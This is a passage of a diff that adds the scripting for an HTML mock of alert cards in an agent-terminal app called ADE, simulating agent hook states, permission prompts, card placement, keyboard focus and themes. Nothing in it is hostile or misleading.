+  answer: () => { const id = ["p2a", "p2s", "p2b"].find((k) => PANES[k].hook === "needsYou"); if (!id) return log("Tab 2 has no prompt open."); setHook(id, "working"); },
+  quiet: () => { PANES.p2a.tracker = true; silence("p2a"); },
+  quietTask: () => { S.task = true; PANES.p2a.tracker = true; silence("p2a"); S.task = false; },
+  caseQ: () => { show("question"); FIRE.case6(); },
+  caseQS: () => { show("question"); FIRE.case2(); },
+  burst: () => { FIRE.needs(); later(1000, () => show("notSent")); },
+  clear: () => { clearAll(); log("Cleared."); },
+  simLaunch: () => launch("p2a"),
+  simPrompt: () => (hooksLive(PANES.p2a, "p2a") ? setHook("p2a", "working") : log("A prompt was sent. No hooks here, so ADE sees only output.")),
+  simSilence: () => silence("p2a"),
+  simPerm: () => (hooksLive(PANES.p2a, "p2a") ? setHook("p2a", "needsYou") : log("The agent shows a permission prompt. No hooks here, so ADE cannot know.")),
+  simAnswer: () => (PANES.p2a.hook === "needsYou" ? setHook("p2a", "working") : log("No prompt open in tab 2.")),
+  simStop: () => (hooksLive(PANES.p2a, "p2a") ? setHook("p2a", "finished") : log("The turn ended. No hooks here, so ADE sees only the silence that follows.")),
+  simEnd: () => setHook("p2a", null),
+  simHooksOn: () => { S.src = "claudeOn"; $("#src").value = "claudeOn"; log("Agent status turned on for this project. Hooks fire from the next event on."); },
+  simCd: () => { log("The active terminal changed folder."); if (FU("f10")) withdraw("context-guard", "the active terminal left that folder"); else if (cards.some((c) => c.def.kind === "warning" && c.def.hint)) log("The context card stays, and its button would type into this terminal (see F10)."); },
+  simGoto: () => gotoAlert(),
+  case1: () => { setSrc("claudeOn", true); launch("p2a"); setHook("p2a", "working"); later(300, () => silence("p2a")); later(900, () => setHook("p2a", "finished")); },
+  case2: () => { setSrc("codex", true); launch("p2a"); later(300, () => silence("p2a")); },
+  case3: () => { setSrc("claudeOff", true); launch("p2a"); later(200, () => silence("p2a")); later(600, () => FIRE.simHooksOn()); later(900, () => setHook("p2a", "needsYou")); later(1400, () => setHook("p2a", "working")); later(1800, () => setHook("p2a", "finished")); },
+  case4: () => { setSrc("claudeOn", false); launch("p2a"); setHook("p2a", "working"); later(200, () => setHook("p2a", "finished")); later(500, () => setHook("p2a", null)); },
+  case5: () => { ensure("p2a"); PANES.p2a.hook = "working"; setHook("p2a", "needsYou"); PANES.p2b.hook = "working"; later(400, () => setHook("p2b", "finished")); },
+  case6: () => { setSrc("claudeOn", false); launch("p2a"); setHook("p2a", "working"); later(300, () => silence("p2a")); later(700, () => setHook("p2a", "finished")); },
+};
+for (const k of Object.keys(DEFS)) if (!FIRE[k] && k !== "stopped") FIRE[k] = () => show(k);
+function setSrc(v, tracked) { S.src = v; S.tracked = tracked; $("#src").value = v; $("#opt-tracked").checked = tracked; }
+const KEYS = { Digit1: "needs", Digit2: "quiet", Digit3: "context", Digit4: "question", Digit5: "notSent", Digit0: "clear" };
+
+/* F8 only. The restyle gives an alert no key. */
+function gotoAlert() {
+  if (!FU("f8")) return log("No key and no command reaches a card in the restyle: its buttons are in the Tab order, after the rest of the window (see F8).");
+  if (slot.contains(document.activeElement)) { (lastOutside ?? home()).focus(); return log("Focus back where it was."); }
+  const target = [...cards].sort((a, b) => RANK.indexOf(b.def.kind) - RANK.indexOf(a.def.kind) || a.id - b.id)[0];
+  const btn = target?.el.querySelector("button");
+  if (btn) { btn.focus(); log("Focus moved to the card's first button."); } else log("No card with a button to go to.");
+}
+
+/* ================= wiring ================= */
+document.addEventListener("focusin", (e) => { if (win.contains(e.target) && !slot.contains(e.target)) lastOutside = e.target; });
+slot.addEventListener("mouseenter", () => { hover = true; if (FU("f4")) syncTimers(false); });
+slot.addEventListener("mouseleave", () => { hover = false; if (FU("f4")) syncTimers(false); });
+for (const b of $$("[data-fire]")) {
+  b.addEventListener("mousedown", (e) => e.preventDefault()); // a mouse click on a trigger leaves the cursor where it is
+  b.addEventListener("click", () => FIRE[b.dataset.fire]());
+}
+document.addEventListener("keydown", (e) => {
+  if (e.altKey && !e.metaKey && !e.ctrlKey && KEYS[e.code]) { e.preventDefault(); FIRE[KEYS[e.code]](); return; }
+  if (e.altKey && !e.metaKey && !e.ctrlKey && e.code === "KeyG") { e.preventDefault(); gotoAlert(); return; }
+  if (e.key !== "Escape" || !win.contains(document.activeElement)) return;
+  const inCard = cards.find((c) => c.el.contains(document.activeElement));
+  if (inCard && FU("f8")) {
+    // F8: the card takes Esc only while focus is inside it, and stops it there.
+    e.preventDefault(); e.stopPropagation();
+    if (closable(inCard.def)) remove(inCard, "Esc"); else { (lastOutside ?? home()).focus(); log("Esc: a question has no dismiss. Focus back where it was."); }
+    return;
+  }
+  // The app's own Esc (useKeybindings.ts 161-172): close the scratchpad, focus the terminal. A card is not involved.
+  if (S.piece.scratch) { $('[data-toggle="scratch"]').checked = false; setPiece("scratch", false); log("Esc closed the scratchpad (the app's own rule)."); }
+  home().focus();
+  if (inCard) log("Esc went to the app, not the card: focus is in the terminal and the card is still there.");
+});
+function setCaption() {
+  const P = {
+    AB: "<b>AB, recommended: top right on a terminal tab, bottom right on every other tab kind.</b> On a terminal tab the card hangs 28 px under the top of the terminal area, under the pane header and its REC button, 12 px from the right edge of the content column. On an editor, browser, fleet, orchestrator or contracts tab it sits where B does, clear of that tab's top-right controls. It is never over a side panel. Switch the tab kind, the new-terminal state and what is open over the window to see what it costs.",
+    A: "<b>A, top right of the tab's content on every tab kind.</b> Terminal tab: 28 px under the top of the terminal area, so under the pane header and REC; it starts under a find bar it would meet. It covers the right end of the first rows on screen: old output in a full terminal, the prompt and newest output in a new or cleared one. Other tab kinds: 8 px down, over their top-right controls.",
+    B: "<b>B, bottom right of the tab's content on every tab kind.</b> 12 px above the bottom of the content column, 12 px from its right edge. Never over a side panel, the scratchpad or the shortcut bar. In a full terminal it covers the right end of the newest lines, of Claude Code's input box and of its status line; in a new or cleared terminal, empty rows.",
+    C: "<b>C, where the toast is today.</b> Fixed to the window: 60 px up, 20 px in. Nothing moves. With a right panel open it sits on the panel, not the terminal; with the scratchpad open it sits on the scratchpad.",
+  };
+  cap.innerHTML = S.view === "today"
+    ? "<b>Today.</b> One toast, fixed to the window 60 px from the bottom and 20 px from the right. Every alert looks the same. A new toast replaces the one on screen. Tick the window pieces to see what it lands on."
+    : S.view === "restyle"
+      ? `<b>Restyle.</b> Still one alert at a time, the same triggers, the same 4 s, 15 s and stays-until-answered, the same ways out. New: the card, a kind and an icon for each alert, the words, safe handling of names and error text, and where it sits. ${P[S.place]}`
+      : `<b>Follow-ups.</b> The restyle, plus whichever switches are on. ${P[S.place]}`;
+}
+function layout() {
+  for (const c of ["small", "def", "topfill", "stack", "split"]) win.classList.toggle(c, !!S.piece[c]);
+  const second = S.piece.split && S.piece.active2;
+  $("#pane1").classList.toggle("active", !second); $("#pane2").classList.toggle("active", second);
+  const isTerm = S.kind === "terminal";
+  for (const n of $$("[data-piece]")) {
+    const p = n.dataset.piece;
+    if (p === "find") n.hidden = n !== visibleFind();
+    else if (p === "panes") n.hidden = !isTerm;
+    else if (p === "editor") n.hidden = S.kind !== "editor";
+    else if (p === "strip" || p === "notice") n.hidden = !S.piece[p] || !isTerm; // the strip shows on terminal tabs only
+    else n.hidden = !S.piece[p];
+  }
+  for (const n of $$("[data-kindview]")) n.hidden = n.dataset.kindview !== S.kind;
+  for (const n of $$("[data-ov]")) n.hidden = n.dataset.ov !== S.overlay;
+  const a = document.activeElement;
+  if (a === document.body || Object.values(HOME).includes(a.id)) home().focus();
+  place();
+}
+function setPiece(k, on) { S.piece[k] = on; layout(); }
+function setKind(k) {
+  S.kind = k; $("#kind").value = k;
+  if (FU("f10") && k !== "terminal") withdraw("context-guard", "no terminal is active");
+  layout(); setCaption();
+}
+function setOverlay(o) { S.overlay = o; $("#overlay").value = o; layout(); }
+function setView() {
+  clearAll(); resetPanes();
+  S.active = "t1";
+  if (S.view !== "follow") setSrc("claudeOn", true);
+  document.body.dataset.view = S.view;
+  $("#fs-place").disabled = S.view === "today";
+  $("#fs-fu").hidden = $("#fs-sim").hidden = S.view !== "follow";
+  syncRegions(); renderTabs(); setCaption(); place();
+}
+for (const r of $$('input[name="view"]')) r.addEventListener("change", () => { S.view = r.value; setView(); log(`View: <b>${S.view}</b>.`); });
+for (const r of $$('input[name="place"]')) r.addEventListener("change", () => { S.place = r.value; setCaption(); place(); log(`Placement <b>${S.place}</b>.`); });
+for (const r of $$('input[name="nm"]')) r.addEventListener("change", () => { S.nm = r.value; setView(); });
+for (const r of $$('input[name="err"]')) r.addEventListener("change", () => { S.err = r.value; });
+for (const c of $$("[data-toggle]")) c.addEventListener("change", () => setPiece(c.dataset.toggle, c.checked));
+$("#kind").addEventListener("change", (e) => { setKind(e.target.value); log(`Tab kind in front: <b>${esc(e.target.value)}</b>.`); });
+$("#overlay").addEventListener("change", (e) => { setOverlay(e.target.value); log(`Open over the window: <b>${esc(e.target.value)}</b>. The card is drawn over it, as today's toast is.`); });
+$("#pal-rows").append(...["New tab", "Toggle scratchpad", "Open agent picker", "Toggle Preview", "Toggle file browser", "Contracts workbench", "Open recordings", "Split pane right", "Split pane down", "Find in terminal", "Settings", "Keyboard shortcuts"].map((t) => el("div", null, t)));
+for (let i = 1; i <= 14; i++) {
+  const r = el("div", "row"), b = el("span"); b.dataset.name = "a test row's Run and Traces buttons"; b.style.cssText = "display:flex;gap:8px";
+  for (const t of [cp(0x25B6) + " Run", "Traces"]) { const x = el("button", null, t); x.type = "button"; x.tabIndex = -1; b.append(x); }
+  r.append(el("span", null, "test_withdraw_case_" + i), el("span", "grow"), b); $("#bench-rows").append(r);
+}
+for (const c of $$("[data-fu]")) c.addEventListener("change", () => { S.F[c.dataset.fu] = c.checked; clearAll(); resetPanes(); syncRegions(); renderTabs(); log(`${c.dataset.fu.toUpperCase()} ${c.checked ? "on" : "off"}.`); });
+$("#opt-close").addEventListener("change", (e) => { S.close = e.target.checked; for (const c of cards) build(c); place(); });
+$("#opt-edge").addEventListener("change", (e) => { win.dataset.edgefix = e.target.checked ? "on" : "off"; });
+$("#opt-focused").addEventListener("change", (e) => { S.focused = e.target.checked; log(`ADE is ${S.focused ? "the focused window" : "in the background"}.`); syncTimers(S.focused); });
+$("#src").addEventListener("change", (e) => { S.src = e.target.value; });
+$("#opt-tracked").addEventListener("change", (e) => { S.tracked = e.target.checked; });
+const themeSel = $("#theme");
+THEMES.forEach((t, i) => { const o = el("option", null, t[0]); o.value = String(i); themeSel.append(o); });
+function applyTheme(i) {
+  const t = THEMES[i];
+  VARS.forEach((v, k) => win.style.setProperty(v, t[k + 1]));
+  // applyTheme in settingsStore.ts derives the subtle fills this way.
+  win.style.setProperty("--accent-subtle", t[9] + "26"); win.style.setProperty("--accent-hover", t[9] + "40");
+  win.style.setProperty("--green-subtle", t[11] + "26"); win.style.setProperty("--red-subtle", t[12] + "26"); win.style.setProperty("--yellow-subtle", t[13] + "26");
+}
+themeSel.addEventListener("change", () => { applyTheme(Number(themeSel.value)); log(`Theme: <b>${THEMES[themeSel.value][0]}</b>.`); });
+$("#rm").addEventListener("change", (e) => { win.classList.toggle("rm", e.target.checked); });
+$("#fast").addEventListener("change", (e) => { S.fast = e.target.checked; });
+new ResizeObserver(() => place()).observe(win);
+
+applyTheme(0); resetPanes(); setView(); setPiece("side", false); term.focus();
+log("Ready. The cursor is in the stand-in terminal.");
+/* For the headless check only. */
+window.__mock = { S, FIRE, DEFS, get cards() { return cards; }, get toast() { return toast; }, get panes() { return PANES; }, cleanText, cleanName, cleanBody, fullName, sayText, covers, place, eff, home, setPiece, setKind, setOverlay, applyTheme, THEMES, NAMES, ERRS };
+</script>
+</body>
+</html>
